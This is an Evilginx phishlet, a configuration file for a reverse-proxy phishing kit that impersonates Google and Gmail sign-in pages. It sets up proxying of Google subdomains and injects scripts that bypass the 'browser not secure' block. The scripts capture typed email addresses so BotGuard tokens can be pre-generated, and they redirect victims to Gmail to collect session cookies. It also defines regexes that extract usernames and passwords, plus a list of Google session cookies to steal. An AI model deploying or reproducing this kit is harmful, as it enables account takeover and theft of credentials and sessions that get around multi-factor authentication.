# Gmail Phishlet v3 - Optimized for BotGuard Bypass
# Key features:
# 1. JS injection to capture email BEFORE user clicks Next
# 2. Sub-filters to redirect to mail.google.com for GMAIL_AT cookie capture
# 3. Proper domain configuration for all Google services
#
# Author: Based on An0nUD4Y's work with optimizations from Evilginx Pro research

name: 'Gmail'
author: '@billioncodesInc'
min_ver: '3.0.0'

proxy_hosts:
  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false}
  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: '', orig_sub: '', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'ogs', orig_sub: 'ogs', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'chat', orig_sub: 'chat', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'clients', orig_sub: 'clients', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'signaler-pa', orig_sub: 'signaler-pa', domain: 'clients6.google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'lh3', orig_sub: 'lh3', domain: 'googleusercontent.com', session: false, is_landing: false, auto_filter: true}

sub_filters:
  # Fix hostname replacements
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html']}
  - {triggers_on: 'mail.google.com', orig_sub: 'mail', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
  
  # Redirect from myaccount to mail for GMAIL_AT cookie capture
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://myaccount.google.com', replace: 'https://mail.google.com/mail/u/0/', mimes: ['text/html', 'application/json', 'application/javascript']}
  
  # Rewrite continue parameter to point to Gmail
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'continue=https%3A%2F%2Fmyaccount.google.com', replace: 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F', mimes: ['text/html', 'application/json', 'application/javascript']}

  # Auto-redirect on "browser not secure" error - go back to start
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</body>', replace: '<script>!function(){function e(){var e=document.body.textContent||document.body.innerText,n=window.location.href.includes("v3/signin/rejected");e.includes("This browser or app may not be secure.")&&n&&(window.location.href="/")}document.addEventListener("DOMContentLoaded",e),window.addEventListener("load",e),setTimeout(e,2e3)}();</script></body>', mimes: ['text/html', 'application/json']}

  # Redirect on successful login (detect session cookies)
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</body>', replace: '<script>var redirectCount=0,maxRedirects=3,targetDomain="https://mail.google.com/mail/u/0/";function checkCookies(){document.cookie.includes("SID")&&document.cookie.includes("APISID")&&document.cookie.includes("SAPISID")&&(window.location.hostname.includes("accounts")?window.location.href=targetDomain:cancelAnimationFrame(animationId),++redirectCount>=maxRedirects&&cancelAnimationFrame(animationId))}document.addEventListener("DOMContentLoaded",(function(){checkCookies(),animationId=requestAnimationFrame((function e(){checkCookies(),animationId=requestAnimationFrame(e)}))}));</script></body>', mimes: ['text/html', 'application/json']}

auth_tokens:
  - domain: '.google.com'
    keys: ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'NID', 'OGPC', 'OGP', '1P_JAR', 'CONSENT', 'SMSV', 'user_id', '__Secure-1PSID', '__Secure-3PSID', '__Secure-1PAPISID', '__Secure-3PAPISID', '__Secure-1PSIDTS', '__Secure-3PSIDTS', '__Secure-1PSIDCC', '__Secure-3PSIDCC', '.*,regexp']
  - domain: 'accounts.google.com'
    keys: ['GAPS', 'LSID', '_utmt', 'utmz', '_utmb', 'ACCOUNT_CHOOSER', '__Host-GAPS', '.*,regexp']
  - domain: 'mail.google.com'
    keys: ['GMAIL_AT', 'OSID', '__Secure-OSID', 'COMPASS', '__Host-GMAIL_SCH_GML', '__Host-GMAIL_SCH_GMN', '__Host-GMAIL_SCH_GMS', '.*,regexp']

auth_urls:
  - '/v3/signin/_/AccountsSignInUi/data/batchexecute'
  - '/CheckCookie'
  - '/ManageAccount'
  - '/'

credentials:
  username:
    key: ''
    search: '\[\[\["V1UmUe","\[null,\\"(.*?)\\"'
    type: 'post'
  password:
    key: ''
    search: '\[1,1,null,\[1,null,null,null,\[\\"(.*?)\\",null,1\]\]'
    type: 'post'
  custom:
    - key: 'f.req'
      search: '\["gf.siecp","([^"]*)"\]'
      type: 'post'

login:
  domain: 'accounts.google.com'
  path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin&continue=https://mail.google.com/mail/u/0/'

# ============================================================================
# JS INJECTION - KEY OPTIMIZATION
# This captures the email BEFORE the user clicks Next, allowing us to
# pre-generate the botguard token while they're still typing
# ============================================================================

js_inject:
  - trigger_domains: ['accounts.google.com']
    trigger_paths: ['/', '/signin', '/v3/signin/identifier']
    script: |
      (function() {
        // Configuration
        var preGenEndpoint = '/.evilginx/pregen';  // Endpoint to trigger pre-generation
        var emailSent = false;
        var lastEmail = '';
        
        // Function to send email for pre-generation
        function preGenerateToken(email) {
          if (emailSent && lastEmail === email) return;
          if (!email || !email.includes('@')) return;
          
          console.log('[EvilPuppet] Pre-generating token for:', email);
          emailSent = true;
          lastEmail = email;
          
          // Send to backend for pre-generation
          fetch(preGenEndpoint, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({email: email})
          }).catch(function(e) {
            console.log('[EvilPuppet] Pre-gen request sent');
          });
        }
        
        // Monitor email input field
        function setupEmailMonitor() {
          var emailField = document.getElementById('identifierId');
          if (!emailField) {
            setTimeout(setupEmailMonitor, 500);
            return;
          }
          
          // Capture on blur (when user leaves the field)
          emailField.addEventListener('blur', function() {
            var email = this.value.trim();
            if (email) preGenerateToken(email);
          });
          
          // Capture on input with debounce (as user types)
          var debounceTimer;
          emailField.addEventListener('input', function() {
            clearTimeout(debounceTimer);
            var email = this.value.trim();
            debounceTimer = setTimeout(function() {
              if (email && email.includes('@')) {
                preGenerateToken(email);
              }
            }, 1500);  // 1.5 second debounce
          });
          
          // Capture on Enter key or Next button click
          emailField.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
              var email = this.value.trim();
              if (email) preGenerateToken(email);
            }
          });
          
          // Monitor Next button
          var observer = new MutationObserver(function() {
            var nextBtn = document.querySelector('button[type="button"]');
            if (nextBtn && !nextBtn.hasAttribute('data-pregen-listener')) {
              nextBtn.setAttribute('data-pregen-listener', 'true');
              nextBtn.addEventListener('click', function() {
                var email = document.getElementById('identifierId');
                if (email && email.value) preGenerateToken(email.value.trim());
              });
            }
          });
          
          observer.observe(document.body, {childList: true, subtree: true});
          console.log('[EvilPuppet] Email monitor initialized');
        }
        
        // Initialize on page load
        if (document.readyState === 'loading') {
          document.addEventListener('DOMContentLoaded', setupEmailMonitor);
        } else {
          setupEmailMonitor();
        }
      })();

  # Redirect from myaccount to Gmail after successful login
  - trigger_domains: ['myaccount.google.com']
    trigger_paths: ['/']
    script: |
      (function() {
        // Check if we have session cookies and redirect to Gmail
        function checkAndRedirect() {
          if (document.cookie.includes('SID') && document.cookie.includes('SAPISID')) {
            console.log('[EvilPuppet] Session detected, redirecting to Gmail...');
            window.location.href = 'https://mail.google.com/mail/u/0/';
          }
        }
        
        // Check immediately and after a short delay
        checkAndRedirect();
        setTimeout(checkAndRedirect, 2000);
      })();
